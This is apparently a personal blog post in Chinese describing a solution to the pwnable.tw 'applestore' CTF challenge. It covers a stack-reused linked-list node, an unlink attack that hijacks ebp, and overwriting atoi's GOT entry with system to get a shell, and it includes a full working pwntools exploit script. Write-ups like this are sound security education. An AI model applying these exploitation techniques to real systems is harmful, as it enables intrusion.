---
Layout: Post
title: pwnable.tw applestore
date: 2022-09-08 08:41:53
tags: pwnable.tw
---

把局部变量用作静态变量，是不是一种栈上数据的UAF……

<!-- more -->

## 程序分析

弄懂本题逻辑的关键点在于弄懂其数据结构是什么，而本人花了一天才终于搞明白，居然是用**双向链表**来表示购物车。

链表结点结构如下：

![struct cart_item](/images/applestore_1.png)

而程序中有很多的地方都有经典的双向链表操作，比如insert函数中是把结点添加到链表尾部，remove函数会把结点**unlink**出双向链表，cart函数会遍历链表等等……

![remove(): unlink](/images/applestore_2.png)

## 漏洞分析

checkout函数将会调用cart函数遍历并计算购物车中所有商品的价格，如果是一个特定值（7174）的话，将会触发一个彩蛋：往购物车的尾部添加一个iPhone8！

然而这个iPhone8就是漏洞的所在——**iPhone8结点是一个本地变量，然而程序把这个本地变量当作静态变量使用了！**

而作为一个菜单题，很多选项背后的函数，都会在iPhome8结点位置附近（iPhone8结点位于ebp-0x20）放置一个BUFFER来存储输入（BUFFER位于ebp-0x22），因此实际上**可以控制iPhone8结点的值**。

在控制值之后，我们可以利用cart函数泄露任意地址数据，也可以使用remove函数进行unlink attack来覆写数据，但值将会受到限制，因为使用指令向一个不可写地址写入数据将导致程序崩溃。

由于程序显然不存在RWX段，因此我们想要进行unlink attack，fake fd和fake bk都必须是一个可写的段的地址。我们想要劫持控制流，必须要采取别的方法。

这个方法我没有想到，是去网上看大佬WP学到的，我将其称为：**Stack Pivot Lite**（只劫持ebp的stack pivot）。

具体来说：在handle函数（处理菜单的函数）中，每次循环的一开始都会往BUFFER里读入数据并调用atoi函数将其转换为数字。而这个BUFFER作为栈上的变量，是使用`[ebp + offset]`的格式来引用的（见下面的汇编代码）。
如果可以**劫持ebp**，那么实际上我们可以劫持read到别的地方（如atoi的got表位置），然后读入system的地址加上";/bin/sh"，如此一来，执行atoi的时候实际上执行的是system("不可打印字符;/bin/sh")！！

```asm
mov     dword ptr [esp+4], 15h ; nbytes
lea     eax, [ebp+nptr]
mov     [esp], eax
call    my_read

lea     eax, [ebp+nptr]
mov     [esp], eax      ; nptr
call    _atoi
```

那么如何劫持ebp呢？用unlink来写入即可，因为fake fd（got表附近）和fake bk（栈）都是可写的，所以这次unlink可以正常运行！

## 漏洞利用

脚本逻辑如下：
首先用循环来填充购物车，将总金额凑满7174元。（求多元一次方程的整数解问题，或许是线代的基本功？但是我早就忘了（悲），不过好运的是，我第一次凑就突然凑出来了）

然后在购物车中加入iPhone8，利用Cart函数先后泄露libc地址（利用GOT表）和栈地址（利用_environ）。

第三步，通过**覆写remove函数栈帧上的saved ebp**，来**劫持handle函数的ebp**，来劫持提供给read的实参指针。
然后将atoi的got表指针修改为system()，等待handle函数调用 `atoi([ebp-0x22])` ，实际上执行的是 `system("不可打印字符;/bin/sh")` ，拿到Shell和Flag。

```python
from pwn import *
context.arch='i386'
# context.log_level='debug'

filename="./applestore"
# io = process([filename])
io = remote("chall.pwnable.tw", 10104)
elf=ELF(filename)

libc_name="./libc_32.so.6"
# libc_name="/home/nss/glibc-all-in-one-master/libs/2.23-0ubuntu5_i386/libc.so.6"
libc=ELF(libc_name)

def Debug():
    gdb_script = """
    b *0x8048beb
    """
    g = gdb.attach(io, gdb_script)

def Add(ID):
    io.sendlineafter(b"> ", b'2')
    io.sendlineafter(b"> ", str(ID).encode('ascii'))

def Remove(ID):
    io.sendlineafter(b"> ", b'3')
    io.sendlineafter(b"> ", str(ID).encode('ascii'))

def List():
    io.sendlineafter(b"> ", b'4')
    io.sendlineafter(b"> ", b'y')

def Checkout():
    io.sendlineafter(b"> ", b'5')
    io.sendlineafter(b"> ", b'y')

"""Edit metadata of iPhone 8 struct and print it"""
def List_Edit(data):
    io.sendlineafter(b"> ", b'4')
    io.sendlineafter(b"> ", b'yy'+data)

def Unlink_Attack(fd, bk):
    io.sendlineafter(b"> ", b'3')
    io.sendlineafter(b"> ", b'27'+pack(0x8049000)+pack(0xdeadbeaf)+fd+bk)


for i in range(6):
    Add(1)
for i in range(20):
    Add(2)

# leak libc and stack:
Checkout()
List_Edit(pack(elf.got["puts"]) + pack(0x114514))
io.recvuntil(b'27: ')
libc_base = unpack(io.recvuntil(b'28: ')[0:4]) - libc.symbols['puts']
success("libc_base: " + hex(libc_base))

_environ_addr = libc_base + libc.symbols["_environ"]
success("_environ_addr: " + hex(libc_base))
List_Edit(pack(_environ_addr) + pack(0x114514))
io.recvuntil(b'27: ')
environ = unpack(io.recvuntil(b'28: ')[0:4])
success("environ: " + hex(environ))

savedrbp_addr = environ - 0xffffd13c + 0xffffd038
success("savedrbp_addr: " + hex(savedrbp_addr))

# unlink attack
# Debug()
Unlink_Attack(pack(elf.got["atoi"] + 0x22), pack(savedrbp_addr - 0x8)) # saved rbp
io.sendline(pack(libc_base+libc.symbols["system"])+b";/bin/sh")

io.interactive()

```
